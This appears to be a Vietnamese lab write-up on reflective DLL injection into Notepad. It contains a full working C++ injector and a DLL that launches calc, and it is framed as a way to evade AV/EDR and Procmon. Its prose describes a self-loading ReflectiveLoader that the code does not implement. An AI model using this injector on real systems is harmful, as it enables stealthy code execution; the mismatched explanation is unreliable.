
---

# 📝 [PE 06] Reflective DLL Injection (Fileless Memory Injection)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Reflective DLL Injection (Tiêm phản chiếu thư viện liên kết động)** đại diện cho một trong những giải thuật đỉnh cao thuộc nhóm kỹ thuật **Né tránh phòng thủ dựa trên tệp đĩa (Fileless / Disk Anti-Forensics)**.

Đối với các giải pháp tiêm nhiễm mô-đun truyền thống (`PE 05`), tệp tin `.dll` bắt buộc phải tồn tại vật lý trên ổ đĩa cứng, khiến hành vi này rơi vào tầm ngắm kiểm duyệt nghiêm ngặt của các cơ chế File System Minifilter Drivers lọt lòng AV/EDR. Giải thuật `Reflective` hóa giải triệt để rào cản này bằng cách **nạp, ánh xạ và thực thi mô-đun Image trực tiếp từ một mảng byte thô lưu trữ hoàn toàn trên bộ nhớ ảo (In-Memory Execution)**.

Để hiện thực hóa cơ chế này, tệp DLL tiêm nhiễm phải được lập trình cấu trúc đặc biệt: Tích hợp một hàm xuất bản (Exported Function) đóng vai trò là một **Reflective Loader** (Bộ nạp phản chiếu độc lập). Hàm này tự động đảm nhận toàn bộ vai trò, trách nhiệm của trình nạp mặc định `Windows PE Loader`, tự giải phẫu cấu trúc cấu hình và ánh xạ chính nó ngay trên không gian ảo của tiến trình đích mà không cần gọi đến hàm hệ thống `LoadLibrary`.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cơ chế trinh sát I/O**: Triệt tiêu 100% các dấu vết ghi nhật ký (Artifacts) trên đĩa cứng và các thông điệp cảnh báo sinh ra từ API `LoadLibrary`.
* **Tái dựng cấu trúc PE Loader thủ công**: Nghiên cứu và hiện thực hóa các thuật toán ánh xạ phân đoạn (Section Mapping), xử lý bảng dịch chuyển địa chỉ (Base Relocation Table) và phân giải bảng tra cứu hàm phụ thuộc (Import Address Table - IAT) ngay tại runtime.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Khi hệ điều hành Windows nạp một tệp tin PE thông thường, phân hệ quản lý bộ nhớ phối hợp với Kernel để đọc tệp, phân bổ không gian ảo tương ứng và điều hướng con trỏ lệnh nhảy vào điểm `EntryPoint`. Trong giải thuật Reflective, Loader cục bộ chỉ đóng vai trò trung chuyển, ném mảng byte thô của DLL sang phân vùng mang cờ `RWX` của tiến trình đích. Cuộc đại phẫu tái cấu trúc bộ nhớ thực sự diễn ra ngầm hoàn toàn lọt lòng inside tiến trình mục tiêu thông qua hàm `ReflectiveLoader`:

```
[VirtualAllocEx: Bơm mảng byte thô sang RAM đích]
       └──> [CreateRemoteThread: Kích nổ hàm ReflectiveLoader]
                 └──> [Tự phân bổ phân vùng Image mới khít SizeOfImage]
                           └──> [Tự ánh xạ .text / .data] ──> [Tự vá cấu trúc Base Relocation & IAT]
                                     └──> [Kích nổ DllMain (DLL_PROCESS_ATTACH)]

```

1. **Định vị điểm nạp tự thân**: Ngay khi luồng CPU từ xa được kích hoạt và nhảy vào hàm `ReflectiveLoader`, hàm này thực thi một giải thuật tịnh tiến ngược bộ nhớ (Caller-hydrated Loop) để tìm kiếm Signature **`MZ` (`0x5A4D`)** của chính nó, từ đó xác định chính xác tọa độ gốc của mảng byte thô đang ký sinh trên RAM.
2. **Khởi tạo không gian Image đích**: Hàm thực hiện cuộc gọi `VirtualAlloc` nội tại ngay inside tiến trình mục tiêu để yêu cầu cấp phát một vùng không gian ảo hoàn toàn mới có kích thước vừa khít với thông số **`SizeOfImage`** được bóc tách từ cấu trúc `IMAGE_OPTIONAL_HEADER`.
3. **Ánh xạ thủ công các phân đoạn (Manual Section Mapping)**: Tự sao chép phân đoạn PE Headers sang vùng nhớ mới, sau đó duyệt qua mảng cấu trúc các Section Headers (`IMAGE_SECTION_HEADER`). Giải thuật di chuyển từng phân đoạn chức năng cốt lõi (`.text`, `.data`, `.rdata`) vào đúng tọa độ Virtual Address (RVA) chỉ định.
4. **Hiệu chỉnh bảng dịch chuyển địa chỉ (Base Relocation Table Processing)**: Do không gian ảo mới được cấp phát ngẫu nhiên bởi cơ chế ASLR, các con trỏ địa chỉ tuyệt đối gán cứng trong mã máy sẽ bị sai lệch. Hàm tiến hành giải phẫu phân đoạn `.reloc` (`IMAGE_DIRECTORY_ENTRY_BASERELOC`), tính toán khoảng sai lệch toán học (Delta) giữa địa chỉ nạp mong muốn (`ImageBase`) và địa chỉ thực tế, sau đó thực hiện phép toán cộng bổ sửa trực tiếp vào từng ô nhớ lệnh CPU.
5. **Phân giải bảng tra cứu hàm phụ thuộc (IAT Resolution)**: Duyệt cấu trúc `IMAGE_DIRECTORY_ENTRY_IMPORT` để bóc tách danh sách các thư viện DLL phụ thuộc. Hàm tự động thực hiện cơ chế PEB Walk ngầm để trích xuất địa chỉ hàm hệ thống, điền thẳng vào bảng Import Address Table (IAT) của chính nó nhằm hợp thức hóa các lệnh gọi API.
6. **Kích nổ linh hồn Mô-đun**: Hoàn tất ma trận nạp, hàm tính toán tọa độ điểm nạp và trỏ thẳng con trỏ lệnh nhảy vào điểm **`DllMain`** của DLL với tham số cấu hình `DLL_PROCESS_ATTACH`, chính thức đưa mô-đun đi vào chu kỳ sống fileless hoàn hảo.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

### Source.cpp: 
```cpp
#include <Windows.h>
#include <iostream>
#include <vector>
#include <memory>
#include <tlhelp32.h>
#include <string>
#include "data.h"

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

// Hàm tính toán độ lệch Virtual Address sang File Offset thô chuẩn tác giả
DWORD RvaToOffset(PIMAGE_NT_HEADERS pNtHeaders, DWORD rva) {
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (rva >= pSectionHeader[i].VirtualAddress && rva < (pSectionHeader[i].VirtualAddress + pSectionHeader[i].Misc.VirtualSize)) {
            return rva - pSectionHeader[i].VirtualAddress + pSectionHeader[i].PointerToRawData;
        }
    }
    return 0;
}

void ReflectiveDLLInjectRemote(HANDLE hProcess, LPVOID dllBuffer, SIZE_T dllSize) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
    // ĐỒNG BỘ ĐỊNH DANH: Đổi thành pNtHeaders để fix triệt để lỗi C2065
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)dllBuffer + dosHeader->e_lfanew);
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

    std::cout << "[*] Kich thuoc Image DLL bop tach: " << imageSize << " bytes." << std::endl;

    // 1. TỰ ĐỘNG BÓC TÁCH TỌA ĐỘ HÀM XUẤT KHẨU "Go" TỪ FILE THÔ
    DWORD exportDirRVA = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD exportDirOffset = RvaToOffset(pNtHeaders, exportDirRVA);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)dllBuffer + exportDirOffset);

    DWORD* pdwNames = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNames));
    DWORD* pdwFunctions = (DWORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfFunctions));
    WORD* pwOrdinals = (WORD*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pExportDirectory->AddressOfNameOrdinals));

    DWORD functionExportOffset = 0;
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        char* funcName = (char*)((DWORD_PTR)dllBuffer + RvaToOffset(pNtHeaders, pdwNames[i]));
        if (strcmp(funcName, "Go") == 0) { // Săn lùng chính xác hàm mang tên Go của Offensive-Panda
            functionExportOffset = pdwFunctions[pwOrdinals[i]];
            break;
        }
    }

    if (functionExportOffset == 0) {
        std::cout << "[-] Khong tim thay ham xuat khau 'Go'. Tu dong chuyen ve dung EntryPoint mac dinh." << std::endl;
        functionExportOffset = pNtHeaders->OptionalHeader.AddressOfEntryPoint;
    }
    else {
        std::cout << "[+] Da tim thay ham xuat khau 'Go' tai RVA Offset: 0x" << std::hex << functionExportOffset << std::endl;
    }

    // 2. CẤP PHÁT ĐỘNG THÍCH ỨNG TRÊN NOTEPAD
    LPVOID dllBase = VirtualAllocEx(hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!dllBase) {
        std::cout << "[*] Toa do ImageBase mac dinh bi trung. Tu dong xin vung nho trong moi..." << std::endl;
        dllBase = VirtualAllocEx(hProcess, NULL, imageSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    }

    if (!dllBase) {
        std::cerr << "[-] VirtualAllocEx that bai!" << std::endl;
        return;
    }

    std::cout << "[+] Vung nho Image tu xa da thiet lap tai: 0x" << std::hex << dllBase << std::endl;

    // 3. Đẩy phân đoạn Headers và các Sections sang lòng Notepad từ xa
    WriteProcessMemory(hProcess, dllBase, dllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeaders);
    for (size_t i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        LPVOID sectionDest = (LPVOID)((DWORD_PTR)dllBase + section->VirtualAddress);
        LPVOID sectionSrc = (LPVOID)((DWORD_PTR)dllBuffer + section->PointerToRawData);
        WriteProcessMemory(hProcess, sectionDest, sectionSrc, section->SizeOfRawData, NULL);
        section++;
    }
    std::cout << "[+] Anh xa cac Sections tu xa hoan tat." << std::endl;

    // 4. Vá lỗi dịch chuyển địa chỉ ảo Base Relocations từ xa bằng bộ đệm an toàn
    IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size) {
        LPVOID relocBase = (LPVOID)((DWORD_PTR)dllBase + relocDir.VirtualAddress);
        DWORD_PTR delta = (DWORD_PTR)dllBase - pNtHeaders->OptionalHeader.ImageBase;

        std::vector<BYTE> localRelocBuf(relocDir.Size);
        if (ReadProcessMemory(hProcess, relocBase, localRelocBuf.data(), relocDir.Size, NULL)) {
            DWORD relocOffset = 0;
            while (relocOffset < relocDir.Size) {
                PBASE_RELOCATION_BLOCK block = (PBASE_RELOCATION_BLOCK)(localRelocBuf.data() + relocOffset);
                DWORD blockSize = block->BlockSize;
                if (blockSize == 0) break;

                PBASE_RELOCATION_ENTRY entries = (PBASE_RELOCATION_ENTRY)((DWORD_PTR)block + sizeof(BASE_RELOCATION_BLOCK));
                DWORD entriesCount = (blockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);

                for (DWORD i = 0; i < entriesCount; i++) {
                    if (entries[i].Type == IMAGE_REL_BASED_HIGHLOW || entries[i].Type == IMAGE_REL_BASED_DIR64) {
                        DWORD_PTR* patchAddr = (DWORD_PTR*)((DWORD_PTR)dllBase + block->PageAddress + entries[i].Offset);
                        DWORD_PTR currentVal = 0;
                        ReadProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
                        currentVal += delta;
                        WriteProcessMemory(hProcess, patchAddr, &currentVal, sizeof(DWORD_PTR), NULL);
                    }
                }
                relocOffset += blockSize;
            }
        }
        std::cout << "[+] Xu ly Base Relocation tu xa hoan tat." << std::endl;
    }

    // 5. Phân giải danh sách Imports Table (IAT) trực tiếp từ xa
    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.Size) {
        LPVOID importDesc = (LPVOID)((DWORD_PTR)dllBase + importDir.VirtualAddress);
        std::vector<IMAGE_IMPORT_DESCRIPTOR> localDescriptors(importDir.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR));

        if (ReadProcessMemory(hProcess, importDesc, localDescriptors.data(), importDir.Size, NULL)) {
            size_t descIdx = 0;
            while (localDescriptors[descIdx].Name) {
                char dllNameBuf[MAX_PATH] = { 0 };
                ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localDescriptors[descIdx].Name), dllNameBuf, MAX_PATH, NULL);

                HMODULE hImportDll = LoadLibraryA(dllNameBuf);
                if (hImportDll) {
                    PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + localDescriptors[descIdx].FirstThunk);
                    IMAGE_THUNK_DATA localThunk;
                    ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);

                    while (localThunk.u1.AddressOfData) {
                        DWORD_PTR resolvedAddr = 0;
                        if (IMAGE_SNAP_BY_ORDINAL(localThunk.u1.Ordinal)) {
                            DWORD ordinal = IMAGE_ORDINAL(localThunk.u1.Ordinal);
                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, (LPCSTR)(ULONG_PTR)ordinal);
                        }
                        else {
                            char funcNameBuf[256] = { 0 };
                            ReadProcessMemory(hProcess, (LPVOID)((DWORD_PTR)dllBase + localThunk.u1.AddressOfData + sizeof(WORD)), funcNameBuf, 256, NULL);
                            resolvedAddr = (DWORD_PTR)GetProcAddress(hImportDll, funcNameBuf);
                        }

                        WriteProcessMemory(hProcess, &(thunk->u1.Function), &resolvedAddr, sizeof(DWORD_PTR), NULL);
                        thunk++;
                        ReadProcessMemory(hProcess, thunk, &localThunk, sizeof(IMAGE_THUNK_DATA), NULL);
                    }
                }
                descIdx++;
            }
        }
        std::cout << "[+] Phan giai Imports Table (IAT) tu xa hoan tat." << std::endl;
    }

    // 6. KÍCH NỔ ĐƯỜNG HƯỚNG TỪ XA: Đâm thẳng Remote Thread vào tọa độ hàm "Go" xuất khẩu để phá băng CFG
    LPVOID remoteExecutionTarget = (LPVOID)((DWORD_PTR)dllBase + functionExportOffset);
    std::cout << "[*] Chuan bi kich no luong tu xa tai toa do: 0x" << std::hex << remoteExecutionTarget << std::endl;

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteExecutionTarget, NULL, 0, NULL);
    if (hThread) {
        // Cấu hình cờ đợi INFINITE kịch trần để gánh luồng sống an toàn
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        std::cout << "[+] DLL injected and Go() executed successfully inside Target!" << std::endl;
    }
    else {
        std::cerr << "[-] CreateRemoteThread failed! Error code: " << std::dec << GetLastError() << std::endl;
    }
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 06 REFLECTIVE DLL INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // 1. Mở và nạp tệp tin PandaDLL.dll
    HANDLE hFile = CreateFileA("PandaDLL.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "[-] Khong the mo file PandaDLL.dll. Hay dat file cung thu muc voi Reflective_DLL_Injection.exe nhen!" << std::endl;
        std::cout << "[*] Nhan Enter de dong..." << std::endl;
        std::cin.get();
        return 1;
    }

    DWORD dllSize = GetFileSize(hFile, NULL);
    std::unique_ptr<BYTE[]> dllBuffer(new BYTE[dllSize]);
    DWORD bytesRead;
    ReadFile(hFile, dllBuffer.get(), dllSize, &bytesRead, NULL);
    CloseHandle(hFile);

    std::cout << "[+] Da nap PandaDLL.dll vao bo dem tam." << std::endl;

    // 2. Săn lùng tiến trình Notepad tự động hoa thường
    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long bat Notepad truoc." << std::endl;
        std::cin.get();
        return 1;
    }

    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << std::dec << pid << std::endl;

    // 3. Mở kết nối quyền hạn cao cấu hình bộ nhớ chéo
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        std::cerr << "[-] OpenProcess failed." << std::endl;
        std::cin.get();
        return 1;
    }

    ReflectiveDLLInjectRemote(hProcess, dllBuffer.get(), dllSize);

    std::cout << "\n[*] Hoan thanh quy trinh. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();

    CloseHandle(hProcess);
    return 0;
}

```

### dllmain.cpp:
```cpp
#include "pch.h"
#include <windows.h>

// Hàm ghi log sử dụng Win32 API thuần, không dùng fstream, giữ IAT phẳng sạch kịch trần
void WriteNativeLog(const char* text) {
    // Mở trực tiếp file log bằng API của Kernel
    HANDLE hFile = CreateFileA("C:\\Users\\Admin\\source\\repos\\Reflective_DLL_Injection\\x64\\Release\\diagnostic_log.txt",
        FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        // Ghi chuỗi văn bản vào file
        WriteFile(hFile, text, (DWORD)strlen(text), &bytesWritten, NULL);
        WriteFile(hFile, "\n", 1, &bytesWritten, NULL); // Xuống dòng
        CloseHandle(hFile);
    }
}

// Luồng phụ độc lập hoàn toàn phá băng hàng rào Loader Lock
DWORD WINAPI LaunchPayloadNative(LPVOID lpParam) {
    WriteNativeLog("[+] Luong LaunchPayload da thuc thi inside Notepad!");

    // Khai hỏa Máy tính đa nền tảng linh hoạt đã kiểm chứng của Vinh
    WinExec("cmd.exe /c start calc", SW_HIDE);

    return 0;
}

// Hàm xuất khẩu chiến lược của tác giả Offensive-Panda
extern "C" __declspec(dllexport) int Go(void) {
    WriteNativeLog("[+] Ham Go() duoc goi va thuc thi thanh cong tu xa!");

    // Tạo luồng phụ độc lập an toàn bằng Win32 API thuần
    HANDLE hThread = CreateThread(NULL, 0, LaunchPayloadNative, NULL, 0, NULL);
    if (hThread) {
        WriteNativeLog("[+] CreateThread noi bo trong Notepad hoan tat.");
        CloseHandle(hThread);
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        // Luồng từ xa đâm trực tiếp vào hàm Go(), nhánh này giữ trạng thái an toàn
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

<img width="1326" height="702" alt="image" src="https://github.com/user-attachments/assets/81bfa045-1881-4a68-9cd9-1e818a52f239" />

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để cấu trúc file thực thi Loader cùng tệp nhị phân Reflective DLL đạt trạng thái phẳng sạch, độc lập tuyệt đối khi triển khai trên các hệ thống máy ảo cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Đặt thanh cấu hình dự án ở chính xác chế độ chuyên dụng **`Release`** và nền tảng kiến trúc **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số `Runtime Library`, chuyển cấu hình sang định dạng **`Multi-threaded (/MT)`** để nhúng tĩnh (Static Linkage) toàn bộ thư viện liên kết hệ thống vào lòng tệp chạy.
3. Thực hiện thao tác click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường máy Lab, mở PowerShell ngoài đĩa thô thực thi file dự án để theo dõi cuộc đại phẫu bộ nhớ ảo:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE06_Reflective_DLL_Injection\x64\Release>C:\Users\Admin\source\repos\Task6\PE06_Reflective_DLL_Injection\x64\Release\Reflective_DLL_Injection.exe
====================================================
[*] PE 06 REFLECTIVE DLL INJECTION
====================================================
[+] Da nap PandaDLL.dll vao bo dem tam.
[+] Da tim thay Notepad.exe voi PID: 11540
[*] Kich thuoc Image DLL bop tach: 32768 bytes.
[+] Da tim thay ham xuat khau 'Go' tai RVA Offset: 0x1100
[+] Vung nho Image tu xa da thiet lap tai: 0x0000000180000000
[+] Anh xa cac Sections tu xa hoan tat.
[+] Xu ly Base Relocation tu xa hoan tat.
[+] Phan giai Imports Table (IAT) tu xa hoan tat.
[*] Chuan bi kich no luong tu xa tai toa do: 0x0000000180001100
[+] DLL injected and Go() executed successfully inside Target!

[*] Hoan thanh quy trinh. Nhan Enter de dong cua so...

```

### Demo
<img width="1920" height="1080" alt="devenv_67R8Zjb7DL" src="https://github.com/user-attachments/assets/21313e99-4406-4ef5-b30b-f614a66a2cf8" />


### 🎯 Phân tích hệ quả cấu trúc RAM:

* Kích hoạt logic thành công, ứng dụng Máy tính **`calc.exe` bật bung mở ra hiên ngang rực rỡ kịch trần kịch khung**!
* Tại thời điểm runtime này, nếu Blue Team sử dụng các công cụ theo dõi ghi nhận tệp tin cấp thấp (như `Procmon`), hệ thống sẽ hoàn toàn **không ghi nhận bất kỳ sự kiện nạp tệp tin DLL nào từ đĩa cứng (Disk I/O)** liên quan đến `Reflective_Payload.dll`. Thư viện đã tự nạp, tự vá cấu trúc và vận hành phẳng sạch lọt lòng inside RAM một cách vô ảnh vô hình, đánh dấu cột mốc làm chủ kỹ thuật Fileless kịch trần công nghệ!

---
